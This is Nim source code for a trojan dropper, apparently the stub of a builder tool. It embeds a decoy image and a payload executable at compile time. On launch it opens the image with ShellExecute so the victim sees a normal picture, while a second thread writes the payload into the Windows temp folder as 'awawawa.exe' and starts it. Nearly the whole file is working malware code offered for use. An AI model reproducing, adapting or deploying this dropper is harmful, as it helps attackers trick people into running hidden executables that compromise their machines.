import os
import osproc
import strutils

# Compile-time constants, this is supposed to be filled by main application, don't bother trying to pass it manually
const FilePath {.strdefine.}: string = "../pict.jpg"
const PayloadPath {.strdefine.}:string = "../payload/basic.exe"

# Compile-time variable (?) its the content of defined file
const FileData = slurp(FilePath)
const PayloadData = slurp(PayloadPath)

var delimiter = "/"
if count(FilePath, "\\") > 0:
    delimiter = "\\"
var splitted = rsplit(FilePath, delimiter)
let FileName = splitted[splitted.len - 1]
# Get windows temporary folder to place our data, in advanced usage we should avoid this
# write the file data into temporary file
var tempPath = getTempDir()
if not dirExists(tempPath):
    createDir(tempPath)
writeFile(tempPath&FileName, FileData)
type
    HANDLE* = int
    HWND* = HANDLE
    LPCSTR* = cstring
proc ShellExecute(hwnd:HWND, lpOperation:LPCSTR, lpFile:LPCSTR, lpParameters:LPCSTR, lpDirectory:LPCSTR, nShowCmd:int):void {.importc: "ShellExecuteA", stdcall, header:"windows.h".}
# payload procedure, rewrite the payload data into temporary file start it as a process
# simple as hell, too simple tbh
proc payload():void {.gcsafe.} = 
    var target = getTempDir()
    writeFile(target&"awawawa.exe", PayloadData)
    discard startProcess(target&"awawawa.exe")

# Run the file with default app
var thr:Thread[void]
createThread(thr, payload)
ShellExecute(0, "open", tempPath&FileName, nil, nil, 0)
joinThreads(thr)